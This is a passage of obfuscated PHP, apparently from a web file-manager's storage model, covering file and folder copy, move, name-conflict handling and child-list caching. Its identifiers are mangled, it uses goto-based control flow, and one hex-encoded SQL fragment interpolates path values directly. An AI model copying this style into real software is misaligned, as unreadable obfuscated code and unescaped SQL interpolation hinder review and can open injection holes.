$B†ãÜß¬¦Ø, $BĞš»¶, $d½–øò×ê, !1); } } } else { if ($BĞš»¶ == REPEAT_RENAME || $BĞš»¶ == REPEAT_RENAME_FOLDER) { $eä¡¶ƒ­ãë = $this->fileNameAutoCache($DÒíó›½˜æ, $eä¡¶ƒ­ãë, $BĞš»¶, $f»£‡®áğ‡); $BğÍÇ¢ù‰˜ = $this->_copyCreate($AŠï‹ĞÇã¾, $DÒíó›½˜æ, $eä¡¶ƒ­ãë, $d½–øò×ê); } else { if ($BĞš»¶ == REPEAT_REPLACE) { $F‰‰¥«´ß› = $this->sourceInfoCache($B†ãÜß¬¦Ø); $aİÑ÷Ã—…Ê = $this->fileHistory($F‰‰¥«´ß›, $EéÇ”¿“Ó†[$Bê„¨ˆòšª[441]], $EéÇ”¿“Ó†[$Bê„¨ˆòšª[77]]); if ($aİÑ÷Ã—…Ê) { $d½–øò×ê[$Bê„¨ˆòšª[524]][] = $EéÇ”¿“Ó†[$Bê„¨ˆòšª[441]]; } } else { if ($BĞš»¶ == REPEAT_SKIP) { } } } Hook::trigger($Bê„¨ˆòšª[529], array($Bê„¨ˆòšª[530], $EéÇ”¿“Ó†, 0)); } goto aÆ…¬ƒ¬; aÆ…¬ƒ¬: return $BğÍÇ¢ù‰˜; goto b³°Ù¦Ãˆ; BÌËÒ¾êŸÒ: $Bê„¨ˆòšª =& $_SERVER[Š‰]; $EéÇ”¿“Ó† = $this->sourceInfoCache($AŠï‹ĞÇã¾); $f»£‡®áğ‡ = $EéÇ”¿“Ó†[$Bê„¨ˆòšª[397]] == $Bê„¨ˆòšª[86]; goto cØª¦°ê´; cØª¦°ê´: $eä¡¶ƒ­ãë = $fò…ì‹ªÈ° ? $fò…ì‹ªÈ° : $EéÇ”¿“Ó†[$Bê„¨ˆòšª[28]]; $B†ãÜß¬¦Ø = $this->fileNameExistCache($DÒíó›½˜æ, $eä¡¶ƒ­ãë); if ($D±ÕŠå—ß) { $this->_childrenAllMake($AŠï‹ĞÇã¾); if ($f»£‡®áğ‡ && $B†ãÜß¬¦Ø) { $this->_childrenAllMake($B†ãÜß¬¦Ø); } } goto e¦’¹›ƒæ; b³°Ù¦Ãˆ: } private function _copyCreate($bŸÍ©ÑÛö, $fë´ÆÙî¡¯, $Fµ¢÷ìç, &$a†Ê·ƒ•©) { goto DÒÄÒ Ş; A˜£‚ ƒ: if ($e›‡ª•šÙã[$c„¸‹İÀ—[397]] != $c„¸‹İÀ—[86]) { $a†Ê·ƒ•©[$c„¸‹İÀ—[524]][] = $e›‡ª•šÙã[$c„¸‹İÀ—[441]]; return $Fö˜©Ï¦¢È; } $aùèÉööÆ¶ = array(); $c†òñÈÏ§ = array(); goto e‰øÁ—Á; Eôçß™ä”™: foreach ($bòÕÊí›Õ as $cƒëæ™»¾) { $CîØí÷—° = $cƒëæ™»¾[$c„¸‹İÀ—[390]]; $F‰¿µä’— = $this->_childrenMatch($c—Æñ‡×­, $cƒëæ™»¾, $eœÁŒ¾ğÆ ); $A½•ïéó¦«[] = array($c„¸‹İÀ—[390], $CîØí÷—°, $c„¸‹İÀ—[472], $F‰¿µä’—[$c„¸‹İÀ—[472]]); $bˆÉà«Òâ¯[] = array($c„¸‹İÀ—[390], $CîØí÷—°, $c„¸‹İÀ—[481], $F‰¿µä’—[$c„¸‹İÀ—[481]]); $this->_copyApplyMeta($cƒëæ™»¾, $a†Ê·ƒ•©); if ($cƒëæ™»¾[$c„¸‹İÀ—[397]] != $c„¸‹İÀ—[86]) { $a†Ê·ƒ•©[$c„¸‹İÀ—[524]][] = $cƒëæ™»¾[$c„¸‹İÀ—[441]]; } } $this->chunkEventSet($c„¸‹İÀ—[536], array($c„¸‹İÀ—[537], $CçÃ‡¾Ïğ‘, $Eå†á®¶…Ê)); $this->saveAll($A½•ïéó¦«); goto EÃ‘Ëéø©; dÎ‹Ä×Ğóà: $CçÃ‡¾Ïğ‘ = $this->_makeItemData($e›‡ª•šÙã, $c½˜’ŸØ¸‚, $Fµ¢÷ìç); Hook::trigger($c„¸‹İÀ—[531], $CçÃ‡¾Ïğ‘); Hook::trigger($c„¸‹İÀ—[532], array($c„¸‹İÀ—[533], $CçÃ‡¾Ïğ‘, 0)); goto fİŒÂ–Ã÷•; dÆÌ´Íƒ: $eœÁŒ¾ğÆ  = $this->sourceInfo($Fö˜©Ï¦¢È); foreach ($aùèÉööÆ¶ as $cƒëæ™»¾) { $aÆ¡Î£Šì˜ = $this->_makeItemData($cƒëæ™»¾, $eœÁŒ¾ğÆ , $cƒëæ™»¾[$c„¸‹İÀ—[28]]); $aÆ¡Î£Šì˜[$c„¸‹İÀ—[481]] = $cƒëæ™»¾[$c„¸‹İÀ—[481]]; $c†òñÈÏ§[] = $aÆ¡Î£Šì˜; } $this->chunkEventSet($c„¸‹İÀ—[534], array($c„¸‹İÀ—[535], $CçÃ‡¾Ïğ‘, $Eå†á®¶…Ê)); goto AãšËËëµâ; cìí¿°ŞÅÇ: $c—Æñ‡×­[$bŸÍ©ÑÛö] = $Fö˜©Ï¦¢È; $A½•ïéó¦« = array(); $bˆÉà«Òâ¯ = array(); goto Eôçß™ä”™; fİŒÂ–Ã÷•: $Fö˜©Ï¦¢È = $this->add($CçÃ‡¾Ïğ‘); $b„èİî = array($c„¸‹İÀ—[390] => $Fö˜©Ï¦¢È, $c„¸‹İÀ—[28] => $Fµ¢÷ìç); $this->_copyApplyMeta($b„èİî, $a†Ê·ƒ•©); goto A˜£‚ ƒ; AãšËËëµâ: $this->addAll($c†òñÈÏ§, array(), !1); $bòÕÊí›Õ = $this->where(array($c„¸‹İÀ—[472] => $Fö˜©Ï¦¢È))->select(); $c—Æñ‡×­ = $this->_childrenMakeRelation($aùèÉööÆ¶, $bòÕÊí›Õ); goto cìí¿°ŞÅÇ; e‰øÁ—Á: $this->_childrenListAll($bŸÍ©ÑÛö, $aùèÉööÆ¶); $Eå†á®¶…Ê = count($aùèÉööÆ¶); if ($Eå†á®¶…Ê == 0) { return $Fö˜©Ï¦¢È; } goto dÆÌ´Íƒ; EÃ‘Ëéø©: $this->chunkEventSet($c„¸‹İÀ—[538], array($c„¸‹İÀ—[539], $CçÃ‡¾Ïğ‘, $Eå†á®¶…Ê)); $this->saveAll($bˆÉà«Òâ¯); return $Fö˜©Ï¦¢È; goto AÌİ†„¥Æ·; DÒÄÒ Ş: $c„¸‹İÀ— =& $_SERVER[Š‰]; $e›‡ª•šÙã = $this->sourceInfoCache($bŸÍ©ÑÛö); $c½˜’ŸØ¸‚ = $this->sourceInfoCache($fë´ÆÙî¡¯); goto dÎ‹Ä×Ğóà; AÌİ†„¥Æ·: } private function _childrenMakeRelation($DÙ…¥ê¹ê, $dÏ¿õ Ê±ñ) { $f®¿¿¼§½× =& $_SERVER[Š‰]; $eØĞ±¬©İÎ = array(); $fŠÂÖïÍ‚¬ = array(); foreach ($DÙ…¥ê¹ê as $bâæ ‘Ë) { $BÜ±–‚¥­Û = $bâæ ‘Ë[$f®¿¿¼§½×[28]] . $f®¿¿¼§½×[8] . $bâæ ‘Ë[$f®¿¿¼§½×[481]]; $eØĞ±¬©İÎ[$BÜ±–‚¥­Û] = $bâæ ‘Ë[$f®¿¿¼§½×[390]]; } foreach ($dÏ¿õ Ê±ñ as $bâæ ‘Ë) { $BÜ±–‚¥­Û = $bâæ ‘Ë[$f®¿¿¼§½×[28]] . $f®¿¿¼§½×[8] . $bâæ ‘Ë[$f®¿¿¼§½×[481]]; $cÈ‹ÌŠ¥‡„ = $eØĞ±¬©İÎ[$BÜ±–‚¥­Û]; $fŠÂÖïÍ‚¬[$cÈ‹ÌŠ¥‡„] = $bâæ ‘Ë[$f®¿¿¼§½×[390]]; } return $fŠÂÖïÍ‚¬; } private function _childrenMatch($AÂàË•¸, $câã¸î½øİ, $c›ÉÆ‹°Şô) { goto cÒ¤¯“Å; aÏ¾šÒ¿Éó: $c®¸‹Äá­— = $B¦Üá×è‰[count($B¦Üá×è‰) - 1]; return array($A•õøêó­¾[472] => $c®¸‹Äá­—, $A•õøêó­¾[481] => $E¤Ùòİ©’­); goto d«ä†åÏ³Ç; cÒ¤¯“Å: $A•õøêó­¾ =& $_SERVER[Š‰]; $E¤Ùòİ©’­ = $c›ÉÆ‹°Şô[$A•õøêó­¾[481]]; $bç÷Î«†‘Î = $this->parentLevelArray($câã¸î½øİ[$A•õøêó­¾[481]]); goto bòØöÄà“£; bòØöÄà“£: foreach ($bç÷Î«†‘Î as $C…„¿©˜·) { if (isset($AÂàË•¸[$C…„¿©˜·])) { $E¤Ùòİ©’­ .= $AÂàË•¸[$C…„¿©˜·] . $A•õøêó­¾[540]; } } $E¤Ùòİ©’­ = rtrim($E¤Ùòİ©’­, $A•õøêó­¾[47]) . $A•õøêó­¾[47]; $B¦Üá×è‰ = $this->parentLevelArray($E¤Ùòİ©’­); goto aÏ¾šÒ¿Éó; d«ä†åÏ³Ç: } private function _makeItemData($c©×öç¢, $eİŒ¹‘Ó¶ƒ, $bíëùƒèœ‚) { $f¨Ä«¬Ñäà =& $_SERVER[Š‰]; $F«×ñ“÷ô‚ = array($f¨Ä«¬Ñäà[541] => $c©×öç¢[$f¨Ä«¬Ñäà[397]], $f¨Ä«¬Ñäà[407] => $bíëùƒèœ‚, $f¨Ä«¬Ñäà[542] => $c©×öç¢[$f¨Ä«¬Ñäà[399]], $f¨Ä«¬Ñäà[442] => $c©×öç¢[$f¨Ä«¬Ñäà[441]], $f¨Ä«¬Ñäà[543] => $c©×öç¢[$f¨Ä«¬Ñäà[77]], $f¨Ä«¬Ñäà[544] => $eİŒ¹‘Ó¶ƒ[$f¨Ä«¬Ñäà[398]], $f¨Ä«¬Ñäà[545] => $eİŒ¹‘Ó¶ƒ[$f¨Ä«¬Ñäà[478]], $f¨Ä«¬Ñäà[546] => USER_ID, $f¨Ä«¬Ñäà[547] => USER_ID, $f¨Ä«¬Ñäà[389] => $eİŒ¹‘Ó¶ƒ[$f¨Ä«¬Ñäà[390]], $f¨Ä«¬Ñäà[548] => $eİŒ¹‘Ó¶ƒ[$f¨Ä«¬Ñäà[481]] . $eİŒ¹‘Ó¶ƒ[$f¨Ä«¬Ñäà[390]] . $f¨Ä«¬Ñäà[47], $f¨Ä«¬Ñäà[416] => 0, $f¨Ä«¬Ñäà[549] => $f¨Ä«¬Ñäà[33]); return $F«×ñ“÷ô‚; } private function _copyApplyMeta($f”§ñ†ˆŒ, &$DÂ¸øù¨õ) { $CÒà·ÒÆˆÂ =& $_SERVER[Š‰]; $DŠé°«šÖî = $f”§ñ†ˆŒ[$CÒà·ÒÆˆÂ[390]]; $EÕòµˆëŸ = $f”§ñ†ˆŒ[$CÒà·ÒÆˆÂ[28]]; if (!isset($f”§ñ†ˆŒ[$CÒà·ÒÆˆÂ[550]]) || !$f”§ñ†ˆŒ[$CÒà·ÒÆˆÂ[550]] || $f”§ñ†ˆŒ[$CÒà·ÒÆˆÂ[550]] == $CÒà·ÒÆˆÂ[491]) { $DÂ¸øù¨õ[$CÒà·ÒÆˆÂ[526]][] = array($CÒà·ÒÆˆÂ[390], $DŠé°«šÖî, $CÒà·ÒÆˆÂ[550], short_id($DŠé°«šÖî)); } if (Input::check($EÕòµˆëŸ, $CÒà·ÒÆˆÂ[551])) { $DÂ¸øù¨õ[$CÒà·ÒÆˆÂ[525]][] = array($CÒà·ÒÆˆÂ[390] => $DŠé°«šÖî, $CÒà·ÒÆˆÂ[92] => $CÒà·ÒÆˆÂ[438], $CÒà·ÒÆˆÂ[370] => str_replace($CÒà·ÒÆˆÂ[50], $CÒà·ÒÆˆÂ[33], Pinyin::encode($EÕòµˆëŸ))); $DÂ¸øù¨õ[$CÒà·ÒÆˆÂ[525]][] = array($CÒà·ÒÆˆÂ[390] => $DŠé°«šÖî, $CÒà·ÒÆˆÂ[92] => $CÒà·ÒÆˆÂ[437], $CÒà·ÒÆˆÂ[370] => Pinyin::encode($EÕòµˆëŸ, $CÒà·ÒÆˆÂ[552])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($a¬ñ§’š¿) { goto b¹ƒ¬Ó–¹; fæ õ•›…ù: $B²Áö«İ = array_to_keyvalue($B²Áö«İ, $cÄ¶ß”«¼®[390]); foreach ($B²Áö«İ as $D¼ï†ÅÉÒô) { $e¢„³¦ÓÎ‰ = $D¼ï†ÅÉÒô[$cÄ¶ß”«¼®[472]]; $a¬ñ§’š¿ = $D¼ï†ÅÉÒô[$cÄ¶ß”«¼®[390]]; if (!isset($this->_childrenListCache[$a¬ñ§’š¿]) && $D¼ï†ÅÉÒô[$cÄ¶ß”«¼®[397]] == $cÄ¶ß”«¼®[86]) { $this->_childrenListCache[$a¬ñ§’š¿] = array(); } if (!isset($this->_childrenListCache[$e¢„³¦ÓÎ‰])) { $this->_childrenListCache[$e¢„³¦ÓÎ‰] = array(); } $this->_childrenListCache[$e¢„³¦ÓÎ‰][$a¬ñ§’š¿] = $D¼ï†ÅÉÒô; $this->_childrenItemCache[$a¬ñ§’š¿] = $D¼ï†ÅÉÒô; } goto dõÏÚ÷ ½´; b¹ƒ¬Ó–¹: $cÄ¶ß”«¼® =& $_SERVER[Š‰]; $F¯Š§Ã‹  = $this->sourceInfo($a¬ñ§’š¿); $AõŸÚ§ÀØ = $cÄ¶ß”«¼®[418]; goto CÙÈ†Â; CÙÈ†Â: $A¨ÑÃõšë = array($cÄ¶ß”«¼®[481] => array($cÄ¶ß”«¼®[507], $F¯Š§Ã‹ [$cÄ¶ß”«¼®[481]] . $a¬ñ§’š¿ . $cÄ¶ß”«¼®[508]), $cÄ¶ß”«¼®[417] => $this->targetIsDelete); $B²Áö«İ = $this->field($AõŸÚ§ÀØ)->where($A¨ÑÃõšë)->select(); if (!$B²Áö«İ) { return; } goto fæ õ•›…ù; dõÏÚ÷ ½´: } private function _childrenListAll($Cˆ »ÀË, &$A¢Ğæå‘­) { $BÆ¥ğØ†–‡ =& $_SERVER[Š‰]; if (!isset($this->_childrenListCache[$Cˆ »ÀË])) { return; } $bšŒß‘²¶ = $this->_childrenListCache[$Cˆ »ÀË]; foreach ($bšŒß‘²¶ as $cåƒ á‹˜ => $e‹ÀÏŸ‘‹…) { $A¢Ğæå‘­[$cåƒ á‹˜] = $e‹ÀÏŸ‘‹…; if ($e‹ÀÏŸ‘‹…[$BÆ¥ğØ†–‡[397]] == $BÆ¥ğØ†–‡[86]) { $this->_childrenListAll($cåƒ á‹˜, $A¢Ğæå‘­); } } } private function sourceInfoCache($E¢ĞîŠƒÒÛ) { if (isset($this->_childrenItemCache[$E¢ĞîŠƒÒÛ])) { return $this->_childrenItemCache[$E¢ĞîŠƒÒÛ]; } return $this->sourceInfo($E¢ĞîŠƒÒÛ); } private function _childrenList($C‡Õ‚Ğ) { if (isset($this->_childrenListCache[$C‡Õ‚Ğ])) { return $this->_childrenListCache[$C‡Õ‚Ğ]; } return $this->_childrenListSelect($C‡Õ‚Ğ); } private function _childrenListSelect($Aêò¼ğİ‚À) { goto F–ñßÛŞ»; d¯ñ†óÚ†™: $fØ®İ£Ğà = $fØ®İ£Ğà ? $fØ®İ£Ğà : array(); $F‹¤ªêˆ… = array_to_keyvalue($fØ®İ£Ğà, $b‚Ğ†¬Ÿ–æ[390]); $this->_childrenListCache[$Aêò¼ğİ‚À] = $F‹¤ªêˆ…; goto Dš“óÌóöÚ; Dš“óÌóöÚ: foreach ($F‹¤ªêˆ… as $Aêò¼ğİ‚À => $fœ°É‹‚†Ò) { $this->_childrenItemCache[$Aêò¼ğİ‚À] = $fœ°É‹‚†Ò; } return $F‹¤ªêˆ…; goto EéÏÖÚÀÓ½; F–ñßÛŞ»: $b‚Ğ†¬Ÿ–æ =& $_SERVER[Š‰]; $c·—µ°˜Û = array($b‚Ğ†¬Ÿ–æ[472] => $Aêò¼ğİ‚À, $b‚Ğ†¬Ÿ–æ[417] => $this->targetIsDelete); $fØ®İ£Ğà = $this->where($c·—µ°˜Û)->select(); goto d¯ñ†óÚ†™; EéÏÖÚÀÓ½: } private function fileNameExistCache($dŠõ”•Õ, $f‡©ğ¸·Ùä) { $E¡‰ÕªÎ‹¢ =& $_SERVER[Š‰]; $f‡©ğ¸·Ùä = strtolower($f‡©ğ¸·Ùä); $fÓ–ÑÖ¾Ò‚ = $this->_childrenList($dŠõ”•Õ); foreach ($fÓ–ÑÖ¾Ò‚ as $cĞÆ³–Ñ™®) { if ($f‡©ğ¸·Ùä == strtolower($cĞÆ³–Ñ™®[$E¡‰ÕªÎ‹¢[28]])) { return $cĞÆ³–Ñ™®[$E¡‰ÕªÎ‹¢[390]]; } } return !1; } private function fileNameAutoCache($c÷ë·Ç¢©â, $bÙù–¶Î·«, $eÜİ¤ëÒó, $a¦ÑİâÌØ) { $aš¯ÖİâÖŒ =& $_SERVER[Š‰]; $E»¶¿¤›š = $this->_childrenList($c÷ë·Ç¢©â); $A×ã‡¹È”„ = array_to_keyvalue($E»¶¿¤›š, $aš¯ÖİâÖŒ[33], $aš¯ÖİâÖŒ[28]); return $this->fileNameAutoGet($A×ã‡¹È”„, $bÙù–¶Î·«, $eÜİ¤ëÒó, $a¦ÑİâÌØ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($b¾éËÑ¸Úå, $CŠ¶ÑÕâ¥«, $Fâ“ˆÔÜ‘« = REPEAT_REPLACE, $eñğÛ”‹Çê = '') { goto bÃÁÅŞƒó¨; bõ£¢ªÒ: if ($DùŞâ½•‚Â[$c¢î±Ø—öÅ[472]] == $CŠ¶ÑÕâ¥« && $eñğÛ”‹Çê != $DùŞâ½•‚Â[$c¢î±Ø—öÅ[28]]) { $DôîÓ“İŠ = $this->fileNameExist($CŠ¶ÑÕâ¥«, $eñğÛ”‹Çê); if ($DôîÓ“İŠ && $DùŞâ½•‚Â[$c¢î±Ø—öÅ[397]] == $c¢î±Ø—öÅ[491]) { goto B±”©ŠÃÛº; B±”©ŠÃÛº: $AÚœ™á”ùÖ = $this->sourceInfo($DôîÓ“İŠ); $B¶ÁîÚ½ñ° = $this->fileHistory($AÚœ™á”ùÖ, $DùŞâ½•‚Â[$c¢î±Ø—öÅ[441]], $DùŞâ½•‚Â[$c¢î±Ø—öÅ[77]]); if (!$B¶ÁîÚ½ñ°) { Model($c¢î±Ø—öÅ[444])->remove($DùŞâ½•‚Â[$c¢î±Ø—öÅ[441]]); } goto Cæ§Ñ¡—Ã; Cæ§Ñ¡—Ã: $this->removeNow($b¾éËÑ¸Úå, !1); $this->folderSizeReset($CŠ¶ÑÕâ¥«); Hook::trigger($c¢î±Ø—öÅ[554], $Dè°„¸ƒºä); goto a«ìğÑØ—Ã; a«ìğÑØ—Ã: return $DôîÓ“İŠ; goto AÅ«Œ¹ö„¯; AÅ«Œ¹ö„¯: } } $eÀƒ¢ŒÂÚÕ = $eñğÛ”‹Çê ? $eñğÛ”‹Çê : $DùŞâ½•‚Â[$c¢î±Ø—öÅ[28]]; $this->lockMoveStart($b¾éËÑ¸Úå); goto D‰‘©©‘ì¸; dõ™¦¨‰Ï¡: if ($DùŞâ½•‚Â[$c¢î±Ø—öÅ[397]] == $c¢î±Ø—öÅ[86] && $c„›ÔÎêøª) { $this->folderSizeResetChildren($C‡íÁ¬™‰³); } Model($c¢î±Ø—öÅ[173])->linkAdd($EÇ„Çˆ÷Î[$c¢î±Ø—öÅ[524]]); if ($c„›ÔÎêøª && $EÇ„Çˆ÷Î[$c¢î±Ø—öÅ[555]]) { $this->removeNow($b¾éËÑ¸Úå, !1); } goto CÁ”ª¯ç; eÛ¸Û¿ô„: $c„›ÔÎêøª = $this->fileNameExistCache($CŠ¶ÑÕâ¥«, $DùŞâ½•‚Â[$c¢î±Ø—öÅ[28]]); $C‡íÁ¬™‰³ = $this->_move($b¾éËÑ¸Úå, $CŠ¶ÑÕâ¥«, $Fâ“ˆÔÜ‘«, $EÇ„Çˆ÷Î, $eñğÛ”‹Çê); $this->sourceCacheClear(); goto dõ™¦¨‰Ï¡; D‰‘©©‘ì¸: $this->lockWriteStart($CŠ¶ÑÕâ¥«, $eÀƒ¢ŒÂÚÕ); $EÇ„Çˆ÷Î = array($c¢î±Ø—öÅ[524] => array(), $c¢î±Ø—öÅ[555] => !1); $this->clearShare($b¾éËÑ¸Úå, $CŠ¶ÑÕâ¥«); goto eÛ¸Û¿ô„; C˜¿‰ŠÜ÷Â: $this->folderSizeReset($CŠ¶ÑÕâ¥«); $a«šÕ‹¢Áì = array($DùŞâ½•‚Â[$c¢î±Ø—öÅ[472]], $CŠ¶ÑÕâ¥«); if ($DùŞâ½•‚Â[$c¢î±Ø—öÅ[397]] == $c¢î±Ø—öÅ[86]) { $a«šÕ‹¢Áì[] = $b¾éËÑ¸Úå; } goto dÒ×§¦ÅÌ±; eòİ¤¥°œ: if ($DùŞâ½•‚Â[$c¢î±Ø—öÅ[472]] == $DŠÚ¾«Ş[$c¢î±Ø—öÅ[390]]) { if ($DùŞâ½•‚Â[$c¢î±Ø—öÅ[417]] == $c¢î±Ø—öÅ[86]) { Model($c¢î±Ø—öÅ[415])->restore(array($b¾éËÑ¸Úå)); } if (!$eñğÛ”‹Çê || $eñğÛ”‹Çê == $DùŞâ½•‚Â[$c¢î±Ø—öÅ[28]]) { return $b¾éËÑ¸Úå; } } $Dè°„¸ƒºä = $this->pathInfoMore($b¾éËÑ¸Úå); if ($this->isParentOf($b¾éËÑ¸Úå, $CŠ¶ÑÕâ¥«)) { return !1; } goto C™¹Âê›…; C™¹Âê›…: if (!$DùŞâ½•‚Â || !$DŠÚ¾«Ş || $DŠÚ¾«Ş[$c¢î±Ø—öÅ[397]] != $c¢î±Ø—öÅ[86]) { return !1; } Hook::trigger($c¢î±Ø—öÅ[553], $Dè°„¸ƒºä); $this->targetIsDelete = intval($DùŞâ½•‚Â[$c¢î±Ø—öÅ[417]]); goto bõ£¢ªÒ; bÃÁÅŞƒó¨: $c¢î±Ø—öÅ =& $_SERVER[Š‰]; $DùŞâ½•‚Â = $this->sourceInfo($b¾éËÑ¸Úå); $DŠÚ¾«Ş = $this->sourceInfo($CŠ¶ÑÕâ¥«); goto eòİ¤¥°œ; CÁ”ª¯ç: $this->lockMoveEnd($b¾éËÑ¸Úå); $this->lockWriteEnd($CŠ¶ÑÕâ¥«, $eÀƒ¢ŒÂÚÕ); $this->folderSizeReset($DùŞâ½•‚Â[$c¢î±Ø—öÅ[472]]); goto C˜¿‰ŠÜ÷Â; bãÆ«‚íÁÒ: return $C‡íÁ¬™‰³; goto c‰ùÊíƒ¬ ; dÒ×§¦ÅÌ±: $this->updateModifyTime($a«šÕ‹¢Áì); Model($c¢î±Ø—öÅ[528])->eventMove($b¾éËÑ¸Úå, $DùŞâ½•‚Â[$c¢î±Ø—öÅ[472]], $CŠ¶ÑÕâ¥«); Hook::trigger($c¢î±Ø—öÅ[554], $Dè°„¸ƒºä); goto bãÆ«‚íÁÒ; c‰ùÊíƒ¬ : } private function _move($a…³¤®è‹³, $bŞƒöóá— , $e†öÎ„µÜÑ, &$C„Ş¾¦æ‰í, $F¾ã¸±õ­‹ = '') { goto e¸æÑ“Éˆ; e¸æÑ“Éˆ: $f«õôª› =& $_SERVER[Š‰]; $aîç‡çò›¬ = $this->sourceInfo($a…³¤®è‹³); $a¤·©‘…Š = $aîç‡çò›¬[$f«õôª›[397]] == $f«õôª›[86]; goto dæÇëøåŠ; A¼†ë–‡·Ì: return $eáìƒ¯µãÉ; goto b©‚¢òÔì; dæÇëøåŠ: $d—Š¿ë¦ñ™ = $F¾ã¸±õ­‹ ? $F¾ã¸±õ­‹ : $aîç‡çò›¬[$f«õôª›[28]]; $CÏäóéÀË“ = $this->fileNameExistCache($bŞƒöóá— , $d—Š¿ë¦ñ™); $this->lockMoveStart($a…³¤®è‹³); goto Bƒõ‚‰µĞæ; Bƒõ‚‰µĞæ: $this->lockWriteStart($bŞƒöóá— , $d—Š¿ë¦ñ™); if (!$CÏäóéÀË“) { return $this->_moveForce($a…³¤®è‹³, $bŞƒöóá— , $d—Š¿ë¦ñ™); } $eáìƒ¯µãÉ = $CÏäóéÀË“; goto BğòØ‘ à÷; BğòØ‘ à÷: $BŞÏÜ“öÅ¸ = !1; if ($a¤·©‘…Š) { if ($e†öÎ„µÜÑ == REPEAT_RENAME_FOLDER) { $d—Š¿ë¦ñ™ = $this->fileNameAuto($bŞƒöóá— , $d—Š¿ë¦ñ™, $e†öÎ„µÜÑ, $a¤·©‘…Š); $eáìƒ¯µãÉ = $this->_moveForce($a…³¤®è‹³, $bŞƒöóá— , $d—Š¿ë¦ñ™); } else { if ($e†öÎ„µÜÑ == REPEAT_RENAME_FOLDER) { $e†öÎ„µÜÑ = REPEAT_RENAME; } $døççå„÷† = $this->_childrenListSelect($a…³¤®è‹³); foreach ($døççå„÷† as $dì¬ì¬×È) { $this->_move($dì¬ì¬×È[$f«õôª›[390]], $CÏäóéÀË“, $e†öÎ„µÜÑ, $C„Ş¾¦æ‰í); } $BŞÏÜ“öÅ¸ = !0; } } else { if ($e†öÎ„µÜÑ == REPEAT_SKIP) { $BŞÏÜ“öÅ¸ = !0; } else { if ($e†öÎ„µÜÑ == REPEAT_RENAME || $e†öÎ„µÜÑ == REPEAT_RENAME_FOLDER) { $d—Š¿ë¦ñ™ = $this->fileNameAuto($bŞƒöóá— , $d—Š¿ë¦ñ™, $e†öÎ„µÜÑ, $a¤·©‘…Š); $eáìƒ¯µãÉ = $this->_moveForce($a…³¤®è‹³, $bŞƒöóá— , $d—Š¿ë¦ñ™); } else { if ($e†öÎ„µÜÑ == REPEAT_REPLACE) { $Bìº¾ºŒ¶Ù = $this->sourceInfoCache($CÏäóéÀË“); $C‚ßù¨ØÉœ = $this->fileHistory($Bìº¾ºŒ¶Ù, $aîç‡çò›¬[$f«õôª›[441]], $aîç‡çò›¬[$f«õôª›[77]]); if ($C‚ßù¨ØÉœ) { $C„Ş¾¦æ‰í[$f«õôª›[524]][] = $aîç‡çò›¬[$f«õôª›[441]]; } else { $BŞÏÜ“öÅ¸ = !0; } } } } } if ($BŞÏÜ“öÅ¸ && !$C„Ş¾¦æ‰í[$f«õôª›[555]]) { $C„Ş¾¦æ‰í[$f«õôª›[555]] = !0; } goto A¼†ë–‡·Ì; b©‚¢òÔì: } private function _moveForce($bí™àº“º¾, $Aí¯ç„Ë˜, $fÅ§À‰ĞğÎ) { goto FÓƒ‚‘‚¿Ñ; dƒÇÆ½İÂ: $eÍË³ÄŒ  = $a‰ÀÄÆ¦[$D’±½­‘²¡[397]] == $D’±½­‘²¡[86]; $C¹Ëäğğ = array($D’±½­‘²¡[389] => $bÌÖ¦¯“¦¯[$D’±½­‘²¡[390]], $D’±½­‘²¡[548] => $bÌÖ¦¯“¦¯[$D’±½­‘²¡[481]] . $bÌÖ¦¯“¦¯[$D’±½­‘²¡[390]] . $D’±½­‘²¡[47], $D’±½­‘²¡[544] => $bÌÖ¦¯“¦¯[$D’±½­‘²¡[398]], $D’±½­‘²¡[545] => $bÌÖ¦¯“¦¯[$D’±½­‘²¡[478]], $D’±½­‘²¡[547] => USER_ID, $D’±½­‘²¡[407] => $fÅ§À‰ĞğÎ); $A¹—‹Ñ›÷ = $a‰ÀÄÆ¦[$D’±½­‘²¡[398]] == SourceModel::TYPE_GROUP && $bÌÖ¦¯“¦¯[$D’±½­‘²¡[398]] == SourceModel::TYPE_GROUP && $a‰ÀÄÆ¦[$D’±½­‘²¡[478]] == $bÌÖ¦¯“¦¯[$D’±½­‘²¡[478]]; goto fåŒ¥³‹œâ; fåŒ¥³‹œâ: if (!$A¹—‹Ñ›÷ && $this->moveClearAuth) { Model($D’±½­‘²¡[476])->authClear($bí™àº“º¾); } $cÛ©ÔõŸœ = $a‰ÀÄÆ¦[$D’±½­‘²¡[417]] == $D’±½­‘²¡[86] && $bÌÖ¦¯“¦¯[$D’±½­‘²¡[417]] != $D’±½­‘²¡[86]; if ($cÛ©ÔõŸœ) { $C¹Ëäğğ[$D’±½­‘²¡[416]] = 0; } goto CîÅß¬À¿É; FÓƒ‚‘‚¿Ñ: $D’±½­‘²¡ =& $_SERVER[Š‰]; $a‰ÀÄÆ¦ = $this->sourceInfo($bí™àº“º¾); $bÌÖ¦¯“¦¯ = $this->sourceInfo($Aí¯ç„Ë˜); goto dƒÇÆ½İÂ; CîÅß¬À¿É: if ($eÍË³ÄŒ ) { $CÀÒÄËÜã = array($D’±½­‘²¡[548] => array($D’±½­‘²¡[507], $a‰ÀÄÆ¦[$D’±½­‘²¡[481]] . $a‰ÀÄÆ¦[$D’±½­‘²¡[390]] . $D’±½­‘²¡[508])); $f½¥ÂšŒóê = $a‰ÀÄÆ¦[$D’±½­‘²¡[481]] . $a‰ÀÄÆ¦[$D’±½­‘²¡[390]] . $D’±½­‘²¡[47]; $CÆ¼ñ¹«¼‰ = $bÌÖ¦¯“¦¯[$D’±½­‘²¡[481]] . $bÌÖ¦¯“¦¯[$D’±½­‘²¡[390]] . $D’±½­‘²¡[47] . $a‰ÀÄÆ¦[$D’±½­‘²¡[390]] . $D’±½­‘²¡[47]; $e¶¾©¤ÒíÙ = array($D’±½­‘²¡[548] => array($D’±½­‘²¡[556], "\162\145\x70\x6c\x61\x63\145\50\160\x61\162\145\156\164\x4c\145\x76\145\x6c\x2c\x27{$f½¥ÂšŒóê}\x27\x2c\x27{$CÆ¼ñ¹«¼‰}\47\51"), $D’±½­‘²¡[544] => $bÌÖ¦¯“¦¯[$D’±½­‘²¡[398]], $D’±½­‘²¡[545] => $bÌÖ¦¯“¦¯[$D’±½­‘²¡[478]]); if ($cÛ©ÔõŸœ) { 